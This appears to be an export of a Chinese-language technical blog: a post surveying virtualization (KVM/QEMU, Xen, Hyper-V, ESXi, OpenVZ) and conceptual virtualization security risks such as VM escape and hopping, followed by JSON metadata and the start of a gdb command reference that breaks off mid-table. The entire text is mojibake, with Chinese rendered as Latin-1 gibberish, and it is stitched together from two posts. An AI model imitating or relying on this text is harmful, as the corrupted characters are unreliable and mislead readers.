æ­¤ç”¨æˆ·å¿…é¡»èŠ±è´¹å¤§é‡çš„æ—¶é—´æ¥å®‰è£…ä¸è®¾ç½®è™šæ‹Ÿæœºï¼Œæ¥ç€æ‰èƒ½å¼€å§‹è¯„ä¼°æˆ–æµ‹è¯•æ‰€éœ€è¿ä½œçš„è½¯ä»¶ï¼Œè¿™äº›è®¾ç½®åŒ…å«äº†æ“ä½œç³»ç»Ÿçš„å®‰è£…ã€å®‰å…¨æ€§æˆ–å…¼å®¹æ€§è½¯ä»¶çš„æ›´æ–°ã€ç½‘ç»œã€ç³»ç»Ÿè®¾å®šç­‰ï¼Œå¦‚æœæ‰€éœ€çš„æ“ä½œç³»ç»Ÿä¸åº•å±‚æ“ä½œç³»ç»Ÿç›¸åŒï¼Œé‚£ä¹ˆå…¶å®å®ƒä»¬æ‰€ä½œçš„è·Ÿå®é™…ä¸Šå®‰è£…ä¸€å°å®ä½“æœºå™¨æ²¡æœ‰ä»€ä¹ˆåŒºåˆ«ã€‚\næ“ä½œç³»ç»Ÿå†…æ ¸è™šæ‹ŸåŒ–å¯ä»¥æœ€å¤§é™åº¦çš„å‡å°‘æ–°å¢è™šæ‹Ÿæœºçš„æ‰€éœ€ï¼Œåœ¨è¿™ä¸ªç­‰çº§çš„è™šæ‹Ÿæœºå…±äº«å®ä½“ä¸»æœºä¸Šçš„ç¡¬ä»¶ä»¥åŠæ“ä½œç³»ç»Ÿï¼Œå‘ˆç°å½¼æ­¤ç‹¬ç«‹ä¸”éš”ç¦»çš„è™šæ‹Ÿæœºç¯å¢ƒã€‚\nåº”ç”¨è½¯ä»¶çš„ç¯å¢ƒæ˜¯ç”±æ“ä½œç³»ç»Ÿã€åº“ã€ç›¸ä¾æ€§è½¯ä»¶ã€ç‰¹å®šäºç³»ç»Ÿçš„æ•°æ®ç»“æ„æˆ–æ–‡ä»¶ç³»ç»Ÿï¼Œä¾‹å¦‚ï¸°NTFSæˆ–Ext4ï¼Œä»¥åŠå…¶ä»–ç¯å¢ƒè®¾ç½®æ‰€ç»„æˆã€‚å¦‚æœè¿™äº›éƒ½ä¿æŒä¸å˜ï¼Œåº”ç”¨è½¯ä»¶å¾ˆéš¾å‘ç°ä¸çœŸå®ç¯å¢ƒçš„åŒºåˆ«ã€‚è¿™æ˜¯æ‰€æœ‰æ“ä½œç³»ç»Ÿç­‰çº§è™šæ‹ŸåŒ–çš„å…³é”®æƒ³æ³•ã€‚\nä¸»è¦ä»£è¡¨æœ‰ï¼šDockerï¼ŒLXCï¼ŒOpenVZ\n  åº“ç­‰çº§çš„è™šæ‹ŸåŒ–ï¼ˆLibrary Levelï¼‰   å¤§éƒ¨åˆ†çš„åº”ç”¨ç¨‹åºéƒ½æ˜¯ä½¿ç”¨ç”±è®¸å¤šåº“ç»„æˆçš„APIï¼ˆApplication Programming Interfaceï¼‰æ¥è®¾è®¡ï¼Œä½¿ç”¨åŠ¨æ€é“¾æ¥çš„æ–¹å¼ç”¨äºéšè—æ“ä½œç³»ç»Ÿçš„ç»†èŠ‚ï¼Œç›®çš„æ˜¯æä¾›ç¨‹åºå‘˜æ›´ç®€å•çš„å·¥ä½œã€‚è¿™ä¹Ÿäº§ç”Ÿäº†ä¸€ç§æ–°çš„è™šæ‹ŸåŒ–æ–¹å¼ï¼Œä½¿ç”¨ä¸åŒçš„APIä¸ä¸åŒæ“ä½œç³»ç»Ÿåº•å±‚çš„ABIï¼ˆApplication Binary Interfaceï¼‰æ¥è¿›è¡Œæ¨¡æ‹Ÿçš„å·¥ä½œã€‚\nä¸»è¦ä»£è¡¨æœ‰ï¼šWineã€WSL(Windows Subsystem for Linux)ã€‚\nä¸€ä¸ªæ˜¯åœ¨linuxè·‘exeï¼Œå¦ä¸€ä¸ªæ˜¯åœ¨windowsä¸‹è·‘linux\n  ç¼–ç¨‹è¯­è¨€ç­‰çº§çš„è™šæ‹ŸåŒ–ï¼ˆProgramming Language Levelï¼‰   æ­¤ç­‰çº§çš„è™šæ‹ŸåŒ–ä¼šå°†é«˜çº§è¯­è¨€è½¬è¯‘æˆä¸€ç§åä¸ºå­—èŠ‚ç çš„è¯­è¨€ï¼Œé€è¿‡è™šæ‹Ÿæœºè½¬è¯‘æˆä¸ºå¯ä»¥ç›´æ¥è¿è¡Œçš„å‘½ä»¤ã€‚è·¨æ“ä½œç³»ç»Ÿå¹³å°ã€è·¨è¯­è¨€çš†ä¸ºå…¶ä¼˜ç‚¹ã€‚å°±å°†å…¶è¯­è¨€å’Œç³»ç»Ÿä½å±‚ä¹‹é—´å†æ¬¡å°è£…äº†ä¸€å±‚è™šæ‹Ÿæœºï¼Œç”±è™šæ‹Ÿæœºå……å½“ä¸­é—´çš„ç¿»è¯‘ã€‚\n ä¼ ç»Ÿç”µè„‘æ˜¯ç”±æŒ‡ä»¤é›†æ¶æ„æ‰€é©±åŠ¨çš„ä¸€ç§æœºæ¢°è¯­è¨€ï¼Œç¡¬ä»¶çš„æ“ä½œç”±ç‰¹æ®Šçš„I/OæŒ‡ä»¤å¤„ç†ï¼Œä¹Ÿå¯ä»¥é€è¿‡åŒºå—æ˜ å°„ï¼ˆMappingï¼‰æ¥æ“ä½œå­˜å‚¨å™¨.\nå¤§æ¦‚æ˜¯ç›´æ¥é€šè¿‡ç¼–è¯‘é“¾æ¥ï¼Œç”Ÿæˆç›¸åº”çš„äºŒè¿›åˆ¶æ–‡ä»¶ã€‚\n ä¸»è¦ä»£è¡¨æœ‰ï¼šOracle Javaã€Microsoft .NET ã€Parrotã€‚\nä¸»è¦æŠ€æœ¯åˆ†ç±»å¦‚ä¸‹ï¼Œæˆ‘ä»¬æ¥ä¸‹æ¥æ‹¿å‡ ä¸ªä»£è¡¨æ€§çš„è®²è®²\n0x03 å…¸å‹çš„è™šæ‹ŸåŒ–æŠ€æœ¯åº”ç”¨  KVM  å®˜ç½‘ï¼šhttp://www.linux-kvm.org/\nKVMï¼ˆKernel-based Virtual Machineï¼‰æ˜¯åŸºäºå†…æ ¸çš„è™šæ‹Ÿæœºï¼ŒKVMæ˜¯é›†æˆåˆ°Linuxå†…æ ¸çš„VMMï¼Œæ˜¯X86æ¶æ„ä¸”ç¡¬ä»¶æ”¯æŒè™šæ‹ŸåŒ–æŠ€æœ¯(Intel VTæˆ–AMD-V)çš„Linuxçš„å…¨è™šæ‹ŸåŒ–è§£å†³æ–¹æ¡ˆã€‚å®ƒæ˜¯Linuxçš„ä¸€ä¸ªå¾ˆå°çš„æ¨¡å—ï¼Œåˆ©ç”¨Linuxåšå¤§é‡çš„äº‹ï¼Œå¦‚ä»»åŠ¡è°ƒåº¦ã€å†…å­˜ç®¡ç†ä¸ç¡¬ä»¶è®¾å¤‡äº¤äº’ç­‰ã€‚\nKVMæœ¬èº«ä¸æ‰§è¡Œä»»ä½•æ¨¡æ‹Ÿï¼Œéœ€è¦ç”¨æˆ·æ§ä»¶ç¨‹åºé€šè¿‡/dev/kvmæ¥å£è®¾ç½®ä¸€ä¸ªå®¢æˆ·æœºçš„è™šæ‹Ÿè™šæ‹Ÿåœ°å€ç©ºé—´ï¼Œå‘å®ƒæä¾›æ¨¡æ‹Ÿçš„I/Oï¼Œå¹¶å°†å…¶è§†é¢‘æ˜¾ç¤ºæ˜ å°„å›å®¿ä¸»æœºçš„æ˜¾ç¤ºå±ã€‚\nKVMæ˜¯ä¸€ä¸ªç‹¬ç‰¹çš„ç®¡ç†ç¨‹åºï¼Œé€šè¿‡å°†KVMä½œä¸ºä¸€ä¸ªå†…æ ¸æ¨¡å—å®ç°ï¼Œåœ¨è™šæ‹Ÿç¯å¢ƒä¸‹Linuxå†…æ ¸é›†æˆç®¡ç†ç¨‹åºå°†å…¶ä½œä¸ºä¸€ä¸ªå¯åŠ è½½çš„æ¨¡å—å¯ä»¥ç®€åŒ–ç®¡ç†å’Œæå‡æ€§èƒ½ã€‚åœ¨è¿™ç§æ¨¡å¼ä¸‹ï¼Œæ¯ä¸ªè™šæ‹Ÿæœºéƒ½æ˜¯ä¸€ä¸ªå¸¸è§„çš„Linuxè¿›ç¨‹ï¼Œé€šè¿‡Linuxè°ƒåº¦ç¨‹åºè¿›è¡Œè°ƒåº¦ã€‚\nè€ŒåŸºäºKVMæ¶æ„çš„VPSï¼Œé»˜è®¤æ˜¯æ²¡æœ‰ç³»ç»Ÿçš„ï¼Œå¯è‡ªå·±ä¸Šä¼ ISOæˆ–è°ƒç”¨æœåŠ¡å•†è‡ªå¸¦çš„ISOæ‰‹åŠ¨å®‰è£…ç³»ç»Ÿã€‚è¿™ä¸ªéå¸¸é€‚åˆçƒ­çˆ±DIYè‡ªå·±VPSçš„å®¢æˆ·ã€‚ç”±äºKVMæ¶æ„å…¨åŠŸèƒ½è™šæ‹ŸåŒ–æ¶æ„ï¼Œç”šè‡³æ‹¥æœ‰ç‹¬ç«‹çš„BIOSæ§åˆ¶ï¼Œæ‰€ä»¥å¯¹æ¯æœåŠ¡å™¨æ€§èƒ½å½±å“è¾ƒå¤§ï¼Œæ‰€ä»¥åŸºäºKVMçš„VPSè¾ƒè´µï¼Œä½†KVM VPSç›¸å¯¹å…¶å®ƒæ¶æ„çš„VPSè¾ƒä¸ºè‡ªç”±ã€‚\nå¦‚å›¾ï¼ŒKVMæ˜¯åŸºäºlinuxçš„ä¸€ä¸ªå†…æ ¸æ¨¡å—ï¼Œè€Œç”¨æˆ·æ— æ³•ç›´æ¥æ§åˆ¶å†…æ ¸æ¨¡å—åšä¸€äº›äº‹æƒ…ï¼Œæ­¤æ—¶kvmçš„å¼€å‘è€…é€‰æ‹©äº†QEMU(å¼€æºè™šæ‹ŸåŒ–å·¥å…·ï¼Œå¯ä»¥è™šæ‹ŸåŒ–ä¸åŒçš„cpu)ï¼Œç„¶åkvmä½¿ç”¨äº†qemuçš„ä¸€éƒ¨åˆ†ä½œä¸ºkvmçš„ç”¨æˆ·ç©ºé—´å·¥å…·ã€‚\n QEMUæ˜¯ä¸€å¥—ç”±Fabrice Bellardæ‰€ç¼–å†™çš„æ¨¡æ‹Ÿå¤„ç†å™¨çš„è‡ªç”±è½¯ä»¶ã€‚å®ƒä¸Bochsï¼ŒPearPCè¿‘ä¼¼ï¼Œä½†å…¶å…·æœ‰æŸäº›åä¸¤è€…æ‰€ä¸å…·å¤‡çš„ç‰¹æ€§ï¼Œå¦‚é«˜é€Ÿåº¦åŠè·¨å¹³å°çš„ç‰¹æ€§ã€‚ç»ç”±kqemuè¿™ä¸ªå¼€æºçš„åŠ é€Ÿå™¨ï¼ŒQEMUèƒ½æ¨¡æ‹Ÿè‡³æ¥è¿‘çœŸå®ç”µè„‘çš„é€Ÿåº¦ã€‚\n kvmå’Œqemuçš„å…³ç³»å¦‚ä¸‹å›¾\n Xen  å®˜ç½‘ï¼šhttp://xen.org/\nXen ç”±å‰‘æ¡¥å¤§å­¦å¼€å‘ï¼Œå®ƒæ˜¯åŸºäºç¡¬ä»¶çš„å®Œå…¨åˆ†å‰²ï¼Œç‰©ç†ä¸Šæœ‰å¤šå°‘çš„èµ„æºå°±åªèƒ½åˆ†é…å¤šå°‘èµ„æºã€‚\nå…¶å¯åˆ†ä¸ºXen-PVï¼ˆåŠè™šæ‹ŸåŒ–ï¼‰ï¼Œå’ŒXen-HVMï¼ˆå…¨è™šæ‹ŸåŒ–ï¼‰ã€‚\nXenæœ€é‡è¦çš„ä¼˜åŠ¿åœ¨äºåŠè™šæ‹ŸåŒ–ï¼Œæ­¤å¤–æœªç»ä¿®æ”¹çš„æ“ä½œç³»ç»Ÿä¹Ÿå¯ä»¥ç›´æ¥åœ¨xenä¸Šè¿è¡Œ(å¦‚Windows)ï¼Œèƒ½è®©è™šæ‹Ÿæœºæœ‰æ•ˆè¿è¡Œè€Œä¸éœ€è¦ä»¿çœŸï¼Œå› æ­¤è™šæ‹Ÿæœºèƒ½æ„ŸçŸ¥åˆ°hypervisorï¼Œè€Œä¸éœ€è¦æ¨¡æ‹Ÿè™šæ‹Ÿç¡¬ä»¶ï¼Œä»è€Œèƒ½å®ç°é«˜æ€§èƒ½ã€‚ï¼ˆå³é‡‡ç”¨å…¨è™šæ‹ŸåŒ–ï¼Œç”¨isoå®‰è£…ä»»æ„ç³»ç»Ÿï¼‰\n hyper-v  å®˜ç½‘ï¼šhttp://www.microsoft.com/zh-cn/server-cloud/\nHyper-Væ˜¯å¾®è½¯æå‡ºçš„ä¸€ç§ç³»ç»Ÿç®¡ç†ç¨‹åºè™šæ‹ŸåŒ–æŠ€æœ¯ï¼Œé‡‡ç”¨å¾®å†…æ ¸çš„æ¶æ„ï¼Œå…¼é¡¾äº†å®‰å…¨æ€§å’Œæ€§èƒ½çš„è¦æ±‚ã€‚Hyper-Våº•å±‚çš„Hypervisorè¿è¡Œåœ¨æœ€é«˜çš„ç‰¹æƒçº§åˆ«ä¸‹ï¼Œå¾®è½¯å°†å…¶ç§°ä¸ºring -1ï¼ˆè€ŒIntelåˆ™å°†å…¶ç§°ä¸ºroot modeï¼‰ï¼Œè€Œè™šæœºçš„OSå†…æ ¸å’Œé©±åŠ¨è¿è¡Œåœ¨ring 0ï¼Œåº”ç”¨ç¨‹åºè¿è¡Œåœ¨ring 3ä¸‹ï¼Œè¿™ç§æ¶æ„å°±ä¸éœ€è¦é‡‡ç”¨å¤æ‚çš„BTï¼ˆäºŒè¿›åˆ¶ç‰¹æƒæŒ‡ä»¤ç¿»è¯‘ï¼‰æŠ€æœ¯ï¼Œå¯ä»¥è¿›ä¸€æ­¥æé«˜å®‰å…¨æ€§ã€‚ä»æ¶æ„ä¸Šè®²Hyper-Våªæœ‰â€œç¡¬ä»¶ï¼Hyper-Vï¼è™šæ‹Ÿæœºâ€ä¸‰å±‚ï¼Œæœ¬èº«éå¸¸å°å·§ï¼Œä»£ç ç®€å•ï¼Œä¸”ä¸åŒ…å«ä»»ä½•ç¬¬ä¸‰æ–¹é©±åŠ¨ï¼Œæ‰€ä»¥å®‰å…¨å¯é ã€æ‰§è¡Œæ•ˆç‡é«˜ï¼Œèƒ½å……åˆ†åˆ©ç”¨ç¡¬ä»¶èµ„æºï¼Œä½¿è™šæ‹Ÿæœº ç³»ç»Ÿæ€§èƒ½æ›´æ¥è¿‘çœŸå®ç³»ç»Ÿæ€§èƒ½ã€‚\n Vmware ESXI  å®˜ç½‘ï¼šhttp://www.vmware.com/\nç”±å›¾å¯è§ï¼Œç®¡ç†å·¥å…·ç›´æ¥åµŒå…¥åˆ°äº†ESXi vmKernelä¸­ï¼Œæ²¡æœ‰åˆ†åŒ–å‡ºç‹¬ç«‹çš„ç®¡ç†å·¥å…·\n OpenVZ  å®˜ç½‘ï¼šhttp://openvz.org/\nOpenVZï¼ˆç®€ ç§°OVZï¼‰é‡‡ç”¨SWsoftçš„Virutozzoè™šæ‹ŸåŒ–æœåŠ¡å™¨è½¯ä»¶äº§å“çš„å†…æ ¸ï¼Œæ˜¯åŸºäºLinuxå¹³å°çš„æ“ä½œç³»ç»Ÿçº§æœåŠ¡å™¨è™šæ‹ŸåŒ–æ¶æ„ã€‚è¿™ä¸ªæ¶æ„ç›´æ¥è°ƒç”¨æ¯æœåŠ¡å™¨ï¼ˆæ¯æœºï¼‰ä¸­çš„å†…æ ¸ï¼Œæ¨¡æ‹Ÿç”Ÿæˆå‡ºå­æœåŠ¡å™¨ï¼ˆVPSï¼Œå°æœºï¼‰ï¼Œæ‰€ä»¥ï¼Œå®ƒç»è¿‡è™šæ‹ŸåŒ–åç›¸å¯¹äºæ¯æœåŠ¡å™¨ï¼Œæ€§èƒ½æŸå¤±å¤§æ¦‚åªæœ‰çš„1-3%ã€‚\nOpenVZå¦ä¸€ä¸ªç‰¹ç‚¹æ˜¯ï¼Œå®ƒæ˜¯ç›´æ¥è°ƒç”¨æ¯æœåŠ¡å™¨çš„å†…æ ¸ï¼Œæ‰€ä»¥ä¼šå¯¼è‡´éƒ¨åˆ†è½¯ä»¶æ— æ³•ä½¿ç”¨ï¼Œä»¥åŠéƒ¨åˆ†å†…æ ¸æ–‡ä»¶æ˜¯æ— æ³•ä¿®æ”¹ã€‚\n0x04 è™šæ‹ŸåŒ–å®‰å…¨ç°çŠ¶  å‚è€ƒï¼š\nå‚è€ƒè®ºæ–‡åœ°å€ï¼šlink\nã€è™šæ‹ŸåŒ–å®‰å…¨ã€‘å…¨é¢è™šæ‹ŸåŒ–å®‰å…¨é£é™©åˆ—è¡¨\u0026ä¸“ä¸šå®‰å…¨å»ºè®®\nè™šæ‹ŸåŒ–å¹³å°çš„å®‰å…¨é—®é¢˜ä¸çœ‹æ³•\nè™šæ‹ŸåŒ–å®‰å…¨â€”â€”æºç¨‹å®‰å…¨æŠ¥é“ ï¼šOWASP\næ“ä½œç³»ç»Ÿä¸è™šæ‹ŸåŒ–å®‰å…¨ ï¼šåŒ—å¤§è¯¾ç¨‹ï¼Ÿï¼Ÿï¼Ÿ\n   è™šæ‹Ÿæœºè”“å»¶\n åƒµå°¸è™šæ‹Ÿæœºï¼šåœ¨å®é™…è¿ç»´è¿‡ç¨‹ä¸­ï¼Œç”±äºå®‰å…¨ç®¡ç†æµç¨‹çš„ä¸è§„èŒƒï¼Œå¯¼è‡´å¾ˆå¤šå·²ç»åœç”¨çš„è™šæ‹ŸæœºåŠç›¸å…³é•œåƒæ–‡ä»¶ä»ç„¶è¢«ä¿å­˜åœ¨ç¡¬ç›˜ä¸Šï¼Œæœ‰äº›å¯èƒ½ä»¥å¤šä»½å¤‡ä»½çš„å½¢å¼è¢«ä¿å­˜ï¼Œå ç”¨äº†æœåŠ¡å™¨çš„å¤§é‡å­˜å‚¨èµ„æºã€‚ è™šèƒ–è™šæ‹Ÿæœºï¼šé€šå¸¸åœ¨é…ç½®è™šæ‹Ÿæœºæ—¶ä¼šåˆ†é…ç•¥é«˜äºå…¶éœ€æ±‚çš„èµ„æºä»¥ä¿è¯å…¶å¯ç”¨æ€§å’Œå®‰å…¨æ€§,ç„¶è€Œè¿‡åº¦çš„èµ„æºåˆ†é…,åŒ…æ‹¬CPUã€å†…å­˜å’Œå­˜å‚¨å®¹é‡ç­‰,ä¼šå¯¼è‡´å…¶ä»–è™šæ‹Ÿæœºèµ„æºçš„åŒ®ä¹,ä»è€Œé€ æˆè¾ƒä¸ºä¸¥é‡çš„èµ„æºæµªè´¹,ç”šè‡³å¯¹ä¼ä¸šä¸šåŠ¡é€ æˆå½±å“ã€‚è™šæ‹Ÿæœºè”“å»¶ä¼šå¯¹ç³»ç»Ÿçš„å®‰å…¨æ€§ã€èµ„æºçš„åˆ©ç”¨ç‡ç­‰äº§ç”Ÿå½±å“,å› æ­¤,åº”é‡‡å–ç›¸åº”çš„æŠ€æœ¯æ‰‹æ®µã€è¿ç”¨ç›¸å…³çš„ç®¡ç†æ–¹æ³•æ¥æŠ‘åˆ¶è™šæ‹Ÿæœºçš„è”“å»¶,ä»¥ä¿è¯è™šæ‹ŸåŒ–éƒ¨ç½²çš„å®‰å…¨æ€§ã€‚    è™šæ‹Ÿæœºè¿ç§»ï¼šè™šæ‹Ÿæœºè¿ç§»æ˜¯æŒ‡å°†è™šæ‹Ÿæœºä»ä¸€ä¸ªä¸»æœºæˆ–å­˜å‚¨ä½ç½®ç§»è‡³å¦ä¸€ä¸ªä¸»æœºæˆ–å­˜å‚¨ä½ç½®çš„è¿‡ç¨‹ã€‚è¿ç§»çš„è¿‡ç¨‹ä¸ä¼šå½±å“ç”¨æˆ·çš„è®¿é—®ï¼Œè¿™é¡¹æŠ€æœ¯ä¹Ÿä½¿å¾—æ•°æ®ä¸­å¿ƒåœ¨èµ„æºåè°ƒæ–¹é¢æ›´åŠ çµæ´»ã€‚ä½†æ˜¯ä»å®‰å…¨è§’åº¦æ¥çœ‹,è™šæ‹Ÿæœºè¿ç§»æŠ€æœ¯ç»™ç³»ç»Ÿå¸¦æ¥äº†ä¸€å®šçš„å®‰å…¨é£é™©ã€‚ç³»ç»Ÿçš„å…¥ä¾µæ£€æµ‹ç³»ç»Ÿé€šå¸¸ä¼šé€šè¿‡ç›‘æµ‹æŒ‡å®šäº¤æ¢æœºç«¯å£æµé‡æ¥å¯¹ç³»ç»Ÿè¿›è¡Œæ£€æµ‹ï¼Œå½“è™šæ‹Ÿæœºå‘ç”Ÿè¿ç§»æ—¶,å¯èƒ½å¯¼è‡´è¿ç§»åçš„è™šæ‹Ÿæœºæµé‡ä¸ç»è¿‡å…¥ä¾µæ£€æµ‹ç³»ç»Ÿæ‰€ç›‘æµ‹çš„ç«¯å£ï¼Œä»è€Œå¯¼è‡´è¿ç§»åçš„è™šæ‹Ÿæœºè„±ç¦»ç³»ç»Ÿçš„å…¥ä¾µæ£€æµ‹ç³»ç»Ÿ,ä»è€Œå¸¦æ¥å®‰å…¨é£é™©ã€‚\n  ç‰¹æ®Šé…ç½®éšæ‚£ï¼šä¸è¯´äº†ï¼Œéƒ½æ˜¯äººä¸ºå› ç´ ï¼Œäººæ‰æ˜¯æœ€å¤§çš„æ¼æ´\n  è™šæ‹ŸåŒ–å®‰å…¨æ”»å‡»\n  è™šæ‹Ÿæœºè·³è·ƒï¼šè™šæ‹Ÿæœºè·³è·ƒæ˜¯æŒ‡æ”»å‡»è€…åŸºäºä¸€å°è™šæ‹Ÿæœºé€šè¿‡æŸç§æ–¹å¼è·å–åŒä¸€ä¸ªHypervisorä¸Šçš„å…¶ä»–è™šæ‹Ÿæœºçš„è®¿é—®æƒé™,è¿›è€Œå¯¹å…¶å±•å¼€è¿›æ”»ã€‚ç”±äºåŒä¸€ä¸ªHypervisorä¸Šçš„è™šæ‹Ÿæœºä¹‹é—´å¯ä»¥é€šè¿‡ç½‘ç»œè¿æ¥æˆ–å…±äº«å†…å­˜çš„æ–¹å¼è¿›è¡Œé€šä¿¡,è¿™ç§æ–¹å¼å°±ä¼šå¯¼è‡´æ”»å‡»è€…è¿›è¡Œè™šæ‹Ÿæœºè·³è·ƒæ”»å‡»ã€‚ å°±æ¯”å¦‚ä¾§ä¿¡é“æ”»å‡»\n  è™šæ‹Ÿæœºé€ƒé€¸ï¼šå¦‚å…¶åï¼Œå³å¯ä»¥é€šè¿‡åœ¨è™šæ‹Ÿæœºä¸­è¿›è¡Œé€ƒé€¸ï¼Œä»è€Œæ§åˆ¶è¿è¡Œè™šæ‹Ÿæœºçš„ç‰©ç†æœº å…¸å‹æ¡ˆä¾‹ï¼šè“è‰²è¯ä¸¸ã€CloudBurstã€‚\n é€ƒé€¸çš„åæœï¼š\n å®‰è£…Hypervisorçº§åé—¨; æ‹’ç»æœåŠ¡æ”»å‡»; çªƒå–æ•°æ®; æ§åˆ¶å…¶ä»–VM;     æ‹’ç»æœåŠ¡æ”»å‡»ï¼šåœ¨è™šæ‹ŸåŒ–åŸºç¡€æ¶æ„ä¸­,è‹¥ç®¡ç†å‘˜åœ¨Hypervisorä¸Šåˆ¶å®šçš„èµ„æºåˆ†é…ç­–ç•¥ä¸å¤Ÿä¸¥è°¨,æ¶æ„æ”»å‡»è€…å°±èƒ½é€šè¿‡åˆ©ç”¨ä¸€ä¸ªè™šæ‹Ÿæœºå°†æ‰€æœ‰çš„ç³»ç»Ÿèµ„æºè€—å°½,ä»è€Œé€ æˆå…¶ä»–çš„è™šæ‹Ÿæœºç”±äºèµ„æºåŒ®ä¹è€Œæ‹’ç»æœåŠ¡ã€‚\n    ","description":"to introduce something about virtualization technology","tags":[],"title":"Virtualization Introduction","uri":"/posts/virtualization-introduction/"},{"categories":["reverse"],"content":"å…³äºgdbçš„å­¦ä¹  0x00 åº GDBæ˜¯ä¸€ä¸ªç”±GNUå¼€æºç»„ç»‡å‘å¸ƒçš„ã€UNIX/LINUXæ“ä½œç³»ç»Ÿä¸‹çš„ã€åŸºäºå‘½ä»¤è¡Œçš„ã€åŠŸèƒ½å¼ºå¤§çš„ç¨‹åºè°ƒè¯•å·¥å…·ã€‚ å¯¹äºä¸€åLinuxä¸‹å·¥ä½œçš„c++ç¨‹åºå‘˜ï¼Œgdbæ˜¯å¿…ä¸å¯å°‘çš„å·¥å…·ã€‚\ngdbä½œä¸ºä¸€ä¸ªåŠ¨æ€è°ƒè¯•å·¥å…·ï¼Œæœ‰ç€éå¸¸å¼ºå¤§çš„åŠŸèƒ½ï¼Œå¾€å¸¸æˆ‘åçˆ±äºé™æ€è°ƒè¯•ï¼Œæ¯”è¾ƒå–œæ¬¢ç›´æ¥ç”¨IDAå’Œobjdumpç›´æ¥è¿˜åŸå‡ºæºç æˆ–æ±‡ç¼–è¿›è¡Œé˜…è¯»ï¼Œå¯¹äºåŠ¨æ€è°ƒè¯•æ–¹é¢æ˜¯æ¯”è¾ƒå¼±çš„ï¼Œä½†æ˜¯æ²¡æœ‰å…³ç³»ï¼Œè¿™æ¬¡æˆ‘ä»¬æ¥å­¦ä¹ å­¦ä¹ gdbï¼Œé¡ºä¾¿åŠ æ·±å¯¹åŠ¨æ€è°ƒè¯•çš„ä½¿ç”¨ã€‚\n å‚è€ƒï¼š(é€šè¿‡googleï¼Œç”šè‡³æ‰¾åˆ°äº†03å¹´çš„gdbæ•™ç¨‹ï¼Œæä¸å¥½è¿™å·¥å…·æ¯”æˆ‘å¹´é¾„è¿˜å¤§ï¼Œä¹Ÿå……åˆ†è¯´æ˜äº†ä»–çš„å®ç”¨æ€§)\ngdb - GNU Project Debugger ï¼š é¡¹ç›®å®˜ç½‘\nDebugging with GDB ï¼šå®˜æ–¹æ–‡æ¡£\nLinux Tools Quick Tutorial : GDB\nlinux c/c++ GDBæ•™ç¨‹è¯¦è§£\nGDB-100-tips - Github ï¼šåœ¨çº¿gitbookç‰ˆæœ¬ï¼ˆhereï¼‰\nhttps://firmianay.gitbooks.io/ctf-all-in-one/content/doc/2.3.1_gdb.html\n 0x01 gdbå‘½ä»¤å‚è€ƒ è¿™è¾¹ä½œä¸ºå¤‡å¿˜ï¼Œåˆ—å‡ºå¸¸ç”¨çš„å‘½ä»¤ï¼Œæ–¹ä¾¿æŸ¥é˜…\nä¸»è¦å‚è€ƒï¼šhttps://github.com/hellogcc/100-gdb-tips/blob/master/refcard.pdf\nè‹¥æœ‰ä¸ä¼šçš„ï¼Œå¯åœ¨gdbå‘½ä»¤è¡Œäº¤äº’æ¨¡å¼æŸ¥çœ‹å¸®åŠ©ï¼šhelp command \né‡è¦å‘½ä»¤    gdbå‘½ä»¤ ä½œç”¨     gdb program [core] è°ƒè¯•ç¨‹åº   b [file:]function åœ¨å‡½æ•°ä¸‹æ–­ç‚¹ï¼Œæ­¤æ—¶å‚æ•°ä¹Ÿå¯ä»¥æ˜¯åœ°å€(*0x00124365)ã€æ–‡ä»¶è¡Œå·   run [arglist] ä»¥arglistä¸ºå‚æ•°ï¼Œè¿è¡Œè¯¥ç¨‹åº   bt backtraceï¼Œæ‰“å°ç¨‹åºå †æ ˆä¿¡æ¯   p expression printï¼Œè®¡ç®—è¡¨è¾¾å¼çš„å€¼   c continueï¼Œç»§ç»­è¿è¡Œç¨‹åºï¼ˆå½“é‡åˆ°æ–­ç‚¹æ—¶ï¼‰   n nextï¼Œå•æ­¥è·Ÿè¸ªç¨‹åºï¼Œå½“é‡åˆ°å‡½æ•°è°ƒç”¨æ—¶ï¼Œä¹Ÿä¸è¿›å…¥æ­¤å‡½æ•°ã€‚å‡½æ•°å½“ä¸€è¡Œå‘½ä»¤ä½¿ç”¨   s stepï¼Œå•æ­¥è°ƒè¯•ï¼Œå¦‚æœæœ‰å‡½æ•°è°ƒç”¨ï¼Œåˆ™è¿›å…¥å‡½æ•°å†…   until è¿è¡Œç¨‹åºç›´è‡³å¾ªç¯ç»“æŸï¼Œåè·Ÿå‚æ•°è¡Œå·iï¼Œåˆ™è¿è¡Œè‡³ç¬¬iè¡Œ   finish è¿è¡Œç¨‹åºï¼Œç›´åˆ°å½“å‰å‡½æ•°å®Œæˆè¿”å›ï¼Œå¹¶æ‰“å°è¿”å›æ—¶çš„å †æ ˆåœ°å€å’Œè¿”å›å€¼åŠå‚æ•°å€¼ç­‰ä¿¡æ¯   call function è°ƒç”¨ç¨‹åºå†…å¯è§çš„å‡½æ•°ï¼Œå¹¶ä¼ é€’å‚æ•°ï¼Œå°±æ˜¯æŠŠä¸€ä¸ªå‡½æ•°æ‹¿æ¥å•ç‹¬ä½¿ç”¨   q quitï¼Œé€€å‡ºgdb    ç¬¬ä¸€ä¸ªå‘½ä»¤çš„core æ˜¯æŒ‡ä¸€èˆ¬é”™è¯¯æ˜¯æœ‰ä¸ªæ ¸å¿ƒå·²è½¬å‚¨ï¼Œæ­¤æ—¶ä¼šäº§ç”Ÿä¸€ä¸ªcoredumpæ–‡ä»¶ï¼Œè¿™é‡Œå¯ä»¥åˆ©ç”¨è¿™ä¸ªcoredumpæ–‡ä»¶è¿›è¡Œè°ƒè¯•\nå…·ä½“å‚è€ƒï¼šhttps://www.cnblogs.com/luhouxiang/p/6830316.html\næŸ¥çœ‹å½“å‰æ ˆå‰16ä¸ªå…ƒç´ ï¼š\u003e x/16x $esp\nè®¾ç½®æ–­ç‚¹    gdbå‘½ä»¤ ä½œç”¨     b [file:]n breakï¼Œåœ¨fileæ–‡ä»¶ä¸‹ç¬¬nè¡Œè®¾ç½®æ–­ç‚¹   b [file:]function breakï¼Œåœ¨fileæ–‡ä»¶ä¸‹çš„functionå‡½æ•°ä¸‹æ–­ç‚¹ï¼Œï¼ˆæ–­ç‚¹åœ¨å‡½æ•°å¼€å§‹çš„ä½ç½®ï¼‰   b +offset åœ¨ç°åœ¨åœæ­¢çš„åœ°æ–¹åç§»offsetè¡Œè®¾ç½®æ–­ç‚¹   b *addr åœ¨addråœ°å€è®¾ç½®æ–­ç‚¹   b ... if expression 